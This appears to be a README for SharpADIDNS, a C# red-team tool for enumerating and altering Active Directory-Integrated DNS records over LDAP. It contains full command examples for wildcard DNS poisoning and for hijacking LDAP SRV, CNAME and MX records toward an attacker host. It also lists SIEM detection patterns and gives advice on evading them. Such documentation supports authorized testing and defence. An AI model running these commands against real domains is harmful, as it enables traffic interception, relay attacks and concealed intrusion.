# SharpADIDNS

C# command-line tool for reading and modifying Active Directory-Integrated DNS (ADIDNS) records over LDAP.

Built around `System.DirectoryServices`. Targets .NET Framework 4.x and produces a small standalone `.exe`. Intended for authorized red team / pentest engagements and lab work.

## Capabilities

| Action  | Description |
| ------- | ----------- |
| enum    | List every `dnsNode` under a zone, with type and value summary |
| query   | Read one node and decode each `dnsRecord` blob in detail, plus an owner + DACL summary |
| add     | Create or update a record (A, AAAA, CNAME, TXT, PTR, SRV, MX, or raw blob) |
| disable | Tombstone the node (soft delete; object stays in AD) |
| remove  | Hard-delete the `dnsNode` object |
| list-zones | Enumerate `dnsZone` objects across all three partitions (DomainDnsZones / ForestDnsZones / System) |

Record builders implement the `DNS_RPC_RECORD` structure from [MS-DNSP] and the `DNS_COUNT_NAME` label encoding used for CNAME / PTR / NS.

## Build

Requires .NET Framework 4.x. From a Developer Command Prompt, or pointing directly at `csc.exe`:

```
csc /optimize+ /r:System.DirectoryServices.dll /out:SharpADIDNS.exe SharpADIDNS.cs
```

`csc.exe` ships with the OS at:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```

No third-party dependencies. A prebuilt binary tracking the current commit is provided under `release/SharpADIDNS.exe`.

## Usage

```
SharpADIDNS.exe <action> [options]
```

### Targeting

| Option | Description |
| ------ | ----------- |
| `--zone <fqdn>`       | DNS zone, e.g. `redteamnotes.local` (required) |
| `--name <label>`      | Record name; `@` = apex, `*` = wildcard (required, except for `enum`) |
| `--dn <DN>`    | Naming context, e.g. `DC=redteamnotes,DC=local` (required) |
| `--partition <name>`  | `DomainDnsZones` (default) / `ForestDnsZones` / `System` |
| `--server <host>`     | Target DC FQDN or IP. Omit for serverless bind. |

### Record data (`add` only)

| Option | Description |
| ------ | ----------- |
| `--type <T>`        | `A` / `AAAA` / `CNAME` / `TXT` / `PTR` / `SRV` / `MX` (default: `A`) |
| `--data <value>`    | IP for A/AAAA; target FQDN for CNAME/PTR/SRV; exchange FQDN for MX; ASCII for TXT (≤255 bytes). Alias: `--ip`. |
| `--srv-priority <N>`| SRV priority, 0..65535 (default: 0) |
| `--srv-weight <N>`  | SRV weight, 0..65535 (default: 0) |
| `--srv-port <N>`    | SRV port, 0..65535 (**required** when `--type SRV`) |
| `--mx-pref <N>`     | MX preference, 0..65535 (default: 10) |
| `--raw <base64>`    | Pre-built `dnsRecord` blob; bypasses `--type` / `--data` and the SRV/MX flags |
| `--ttl <sec>`       | 1..604800 (default: 600) |
| `--force`           | Replace records of the same type on an existing node. Records of other types on the same node are preserved. |

### Authentication

| Option | Description |
| ------ | ----------- |
| `--username <user>`          | UPN or `DOMAIN\user`. Default: current process token. |
| `--password <pwd>`           | Cleartext password. Visible in process listings, Sysmon EID 1, and shell history; emits a warning unless `--allow-cleartext-password` is also passed. |
| `--password-stdin`           | Read password from stdin (one line). |
| `--password-env <VAR>`       | Read password from the named environment variable. |
| `--allow-cleartext-password` | Silence the `--password` cleartext warning. |
| `--ldaps`                    | Bind over LDAPS (port 636). |

When `--username` is given without any password source, the password is prompted interactively (input not echoed). If stdin is redirected (CI, piped scripts), the run errors out with usage code 1 instead of silently waiting.

### Safety

| Option | Description |
| ------ | ----------- |
| `--dry-run`          | For `add` / `disable` / `remove`: bind to AD (read-only), print the intended DN, new blob, and the existing-record delta. **No writes** are performed. Useful for verification before committing changes. |
| `--backup-to <file>` | Before modifying a node (`add --force`, `disable`, `remove`), append a JSON line capturing the existing state to `<file>`. One file accumulates entries across runs. Fields: `timestamp` (UTC ISO 8601), `action`, `dn`, `dNSTombstoned`, `records` (array of base64-encoded `dnsRecord` blobs). |
| `-y`, `--yes`        | Skip the interactive confirmation on high-risk operations (see list below). Required when stdin is not a TTY (CI, piped scripts) -- otherwise high-risk ops refuse to run. |

Restore from a backup file: pipe a relevant base64 blob into `add --raw <base64> --force`. Each line is independent and self-describing.

**High-risk triggers** that prompt for confirmation (or require `--yes`):

- any `remove` -- hard-deletes the `dnsNode` object
- `add --name "*"` -- wildcard hijacks every unresolved name in the zone
- `add --name wpad` / `add --name isatap` -- GQBL-monitored names, heavily flagged by MDI / SIEM
- `add --force` on a node with `dNSTombstoned=TRUE` -- un-tombstone is a known ADIDNS-abuse IOC

### Enum filters (`enum` only)

| Option | Description |
| ------ | ----------- |
| `--filter-type <T,...>` | Comma list of types. Shows nodes that have **at least one** record of these types. Accepted: `A`, `AAAA`, `CNAME`, `PTR`, `SRV`, `MX`, `TXT`, `NS`, `SOA`, `TS` (tombstone). |
| `--filter-name <glob>`  | Match the node name (case-insensitive). `*` and `?` wildcards. Examples: `sql*`, `_*._tcp.*`, `?pad`. |
| `--only-tombstoned`     | Show only tombstoned nodes. |
| `--no-tombstoned`       | Hide tombstoned nodes (active only). |

`--only-tombstoned` and `--no-tombstoned` are mutually exclusive. All filters are applied client-side after the LDAP fetch.

### Output

| Option | Description |
| ------ | ----------- |
| `-v`, `--verbose` | Print DNs, raw blobs, bind details |
| `-q`, `--quiet`   | Suppress `[*]` info lines |
| `-h`, `--help`    | Show full help |
| `-V`, `--version` | Print version and exit |

### Exit codes

| Code | Meaning |
| ---- | ------- |
| 0 | Success |
| 1 | Usage / argument error |
| 2 | LDAP / AD operation failed (see stderr for `ExtendedError`) |
| 3 | Target object not found |
| 4 | Access denied |

## Examples

Enumerate every node in a zone:

```bash
SharpADIDNS.exe enum \
    --zone redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local
```

Enumerate all DNS zones across every partition (no `--zone` needed):

```bash
SharpADIDNS.exe list-zones \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local
```

Read one record and decode all blobs on it:

```bash
SharpADIDNS.exe query \
    --zone redteamnotes.local \
    --name sccm \
    --dn DC=redteamnotes,DC=local
```

Inject a wildcard A record (classic ADIDNS poisoning):

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name "*" \
    --type A \
    --data 10.0.0.66 \
    --ttl 600 \
    --dn DC=redteamnotes,DC=local
```

Add an AAAA record with explicit credentials over LDAPS:

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name web \
    --type AAAA \
    --data fe80::1 \
    --dn DC=redteamnotes,DC=local \
    --server dc.redteamnotes.local \
    --username 'redteamnotes\redpen' \
    --password 'RedteamN0t3s.' \
    --ldaps
```

Add a CNAME (preserves any A/AAAA already on the node when used with `--force`):

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name printer \
    --type CNAME \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Hijack an LDAP `SRV` record (classic Kerberos / LDAP-relay setup):

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name _ldap._tcp.dc._msdcs \
    --type SRV \
    --srv-priority 0 --srv-weight 100 --srv-port 389 \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Add an `MX` record:

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name '@' \
    --type MX \
    --mx-pref 10 \
    --data mail.attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local \
    --force
```

Add a `PTR` record in a reverse zone:

```bash
SharpADIDNS.exe add \
    --zone 0.0.10.in-addr.arpa \
    --name 66 \
    --type PTR \
    --data attacker.redteamnotes.local \
    --dn DC=redteamnotes,DC=local
```

Tombstone a node instead of hard-deleting it:

```bash
SharpADIDNS.exe disable \
    --zone redteamnotes.local \
    --name wpad \
    --dn DC=redteamnotes,DC=local
```

Inject a pre-built record (e.g. for non-standard types or PoC reproduction):

```bash
SharpADIDNS.exe add \
    --zone redteamnotes.local \
    --name custom \
    --raw BASE64_DNSRECORD_BLOB \
    --dn DC=redteamnotes,DC=local \
    --force
```

## Notes

- Any authenticated domain user can create new `dnsNode` objects by default. Existing nodes are owned by their creator; modifying or removing them requires explicit ACEs (creator, `DnsAdmins`, or a delegated ACL).
- `wpad` and `isatap` are blocked by the DNS server's Global Query Block List (GQBL) since Server 2008. The record will be written to AD but the DNS server refuses to answer queries for those names. GQBL is a DNS server registry setting (`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\GlobalQueryBlockList`) and is not visible via LDAP.
- `disable` is more OPSEC-friendly than `remove`: the object stays in AD with `dNSTombstoned=TRUE` and is scavenged by AD after the `DsTombstoneInterval` (default 14 days on Server 2008+).
- Wildcard (`*`) records hijack every unresolved name in the zone. Run `enum` first to confirm you are not stomping legitimate data.
- `--force` replaces records of the **same type** on the target node; records of other types on the same node are kept. To wipe everything, use `disable` or `remove` first.

## Detection surface

What writing to AD-Integrated DNS over LDAP looks like to defenders. Use `--dry-run` to preview, `--backup-to` to leave a rollback trail, and prefer `disable` (tombstone) over `remove` (hard delete) when you have the choice.

### Windows event log

These fire on the **DC that receives the write**. They require Directory Service Access auditing to be enabled (default is off, but commonly enabled in enterprises running MDE / MDI / mature EDR).

| Event ID | Source | Triggered by |
| -------- | ------ | ------------ |
| 5136 | Security | Modify of `dnsRecord` or `dNSTombstoned` (the `add --force` and `disable` paths) |
| 5137 | Security | Creation of a new `dnsNode` (the `add` create path) |
| 5141 | Security | Deletion of a `dnsNode` (the `remove` path) |
| 4662 | Security | DS-Access on the zone container, gated by SACL; fires before 5136/5137/5141 |
| 4624 | Security | Logon on the DC for `--username`/`--password` binds. Not triggered when using the current-process token. |

The 5137 event includes the new node's RDN, so wildcard / `wpad` / `isatap` stand out by name alone.

### Microsoft Defender for Identity

MDI ships a detection family covering ADIDNS abuse. Sensors on each DC tag LDAP traffic plus the 5136/5137/5141 stream. Actions this tool performs commonly trigger:

- **Suspicious DNS record creation** -- new `dnsNode` whose creator is not in a service / admin group, especially for `wpad`, `isatap`, or wildcard.
- **Suspicious DNS attribute modification** -- `dnsRecord` blob mutations on existing high-value nodes.
- **Reconnaissance using DNS** -- bulk enumeration over LDAP (less specific, fires on heavy `enum` use).

`--ldaps` does **not** bypass MDI -- the sensor reads decrypted traffic via local Schannel hooks and consumes the event log directly.

### SIEM patterns to expect

Sentinel / Splunk content packs commonly include rules that this tool will trip:

- `EventID == 5137 AND ObjectClass == dnsNode` (any new dnsNode).
- `EventID == 5136 AND AttributeLDAPDisplayName IN (dnsRecord, dNSTombstoned)` with `OperationType == "Value Added"`.
- Subject of the above not in `Domain Admins` / `DnsAdmins` / `Enterprise Admins`.
- Newly created dnsNodes whose RDN matches `wpad|isatap|\*|localhost`.

### IOCs in the object itself

| Attribute | Why it stands out |
| --------- | ----------------- |
| `dNSTombstoned=TRUE` becoming `FALSE` (un-tombstone) | Rarely benign -- AD scavenging is the only common path that sets it TRUE. The tool prompts before this case unless `--yes` is given. |
| `dnsRecord` blob with `Timestamp=0` (static) in a dynamic-update zone | DDNS clients always write `Timestamp != 0`; raw LDAP writes default to `0`. |
| Unusual TTL (< 60s or > 1d when not warranted) | Defenders profile typical TTLs per zone. |
| `whenChanged` on a node that previously only had DDNS-driven changes | DDNS goes through `secureUpdateAllowed`; raw LDAP writes update `whenChanged` directly. |
| Owner SID on a `dnsNode` that isn't the original creator or a privileged group | Visible in `nTSecurityDescriptor`. The `query` action will surface this in a future release. |

### Replication

The `dnsRecord` attribute is replicated across all DCs in `DomainDnsZones` (or `ForestDnsZones` / `System`, depending on `--partition`). `replPropertyMetaData` records the originating DSA and timestamp -- if you wrote to a non-PDC DC, that DSA shows up in the metadata, not the PDC. Replication can take several minutes; defenders correlating logs across DCs will notice the lag if the change is queried elsewhere quickly.

### Reducing your surface

- Prefer `disable` (no 5141 delete event, no delete in `replPropertyMetaData`).
- Prefer the current-process token to `--username`/`--password` (no 4624 logon spike on the DC).
- Use `--dry-run` before every write -- avoid the "test in prod" footprint.
- Use `--backup-to` so a discovered change can be reverted quickly without re-binding.
- Pick names consistent with the zone's existing operational naming. `wpad` / wildcards / very short names attract attention.
- Set TTLs consistent with surrounding records (`enum` first).

## Record format reference

Every `dnsRecord` value is a `DNS_RPC_RECORD` blob:

```
offset  size  field
0       2     DataLength       (little-endian)
2       2     Type             (little-endian)
4       1     Version          (= 0x05)
5       1     Rank             (0xF0 = DNS_RANK_ZONE for AD-integrated)
6       2     Flags            (little-endian)
8       4     Serial           (little-endian)
12      4     TTL              (BIG-endian)
16      4     Reserved
20      4     Timestamp        (hours since 1601-01-01; 0 = static)
24      N     Type-specific data
```

Type-specific data:

- A (1): 4 bytes IPv4
- AAAA (28): 16 bytes IPv6
- CNAME (5) / PTR (12) / NS (2): `DNS_COUNT_NAME`
- TXT (16): length-prefixed ASCII string(s)
- TS (0, tombstone): 8 bytes `EntombedTime` FILETIME (little-endian)

`DNS_COUNT_NAME` for `foo.bar.example`:

```
[0x11][0x03][0x03]foo[0x03]bar[0x07]example[0x00]
  ^     ^
  |     LabelCount (3)
  cchNameLength (17 = label data including trailing 0x00)
```

## References

- [MS-DNSP] Domain Name Service (DNS) Server Management Protocol
- Powermad (Kevin Robertson) — PowerShell ADIDNS toolkit
- krbrelayx / dnstool.py (dirkjanm) — Python ADIDNS toolkit

## Disclaimer

For use in authorized security assessments, CTFs, and lab environments only. The author assumes no responsibility for misuse.
